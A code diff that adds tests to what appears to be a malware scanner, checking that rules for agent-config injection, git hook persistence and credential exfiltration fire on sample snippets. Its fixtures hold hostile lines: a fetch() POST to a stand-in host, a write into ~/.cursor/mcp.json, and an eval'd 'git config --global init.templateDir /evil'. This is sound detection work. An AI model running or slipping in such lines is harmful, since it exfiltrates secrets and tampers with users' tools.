@@ -184,3 +184,41 @@ def test_credential_exfil_with_split_path_still_critical(tmp_path: Path):
         "fetch('https://drop.invalid', { method:'POST', body:k });\n"
     )
     assert "ST-COMBO-EXFIL" in _ids(_mk(tmp_path, "a.js", js))
+
+
+# ---------- bypass-closure guards (FP fixes must not open an evasion hole) ----------
+
+def test_config_inject_one_hop_variable_is_caught(tmp_path: Path):
+    # The path is built into a variable one hop before the write (not a literal in the write call).
+    js = (
+        "const fs = require('node:fs');\n"
+        "const target = require('node:os').homedir() + '/.cursor/mcp.json';\n"
+        "fs.writeFileSync(target, '{}');\n"
+    )
+    assert "ST-AGENT-CONFIG-INJECT" in _ids(_mk(tmp_path, "a.js", js))
+
+
+def test_config_read_only_health_check_stays_clean(tmp_path: Path):
+    # A tool that RETURNS config paths in a list and only reads them (writing its own state file
+    # elsewhere) must not be flagged, even though the file has a write sink.
+    js = (
+        "const fs = require('node:fs');\n"
+        "const path = require('node:path');\n"
+        "function configs() { return [path.join(process.cwd(), '.claude.json')]; }\n"
+        "function saveState(p) { fs.writeFileSync(p, '{}'); }\n"
+        "for (const c of configs()) { JSON.parse(fs.readFileSync(c, 'utf8')); }\n"
+    )
+    assert "ST-AGENT-CONFIG-INJECT" not in _ids(_mk(tmp_path, "health.js", js))
+
+
+def test_git_persist_via_eval_is_caught(tmp_path: Path):
+    # Hiding the command in a shell string and running it with eval must NOT dodge detection.
+    sh = '#!/bin/bash\ncmd="git config --global init.templateDir /evil"\neval "$cmd"\n'
+    assert "ST-GIT-HOOK-PERSIST" in _ids(_mk(tmp_path, "run.sh", sh))
+
+
+def test_git_persist_printed_restore_help_stays_clean(tmp_path: Path):
+    # An installer that PRINTS how to undo itself ("restore: git config --global core.hooksPath …")
+    # is not installing persistence.
+    sh = '#!/bin/bash\necho "restore with: git config --global core.hooksPath $prev"\n'
+    assert "ST-GIT-HOOK-PERSIST" not in _ids(_mk(tmp_path, "help.sh", sh))
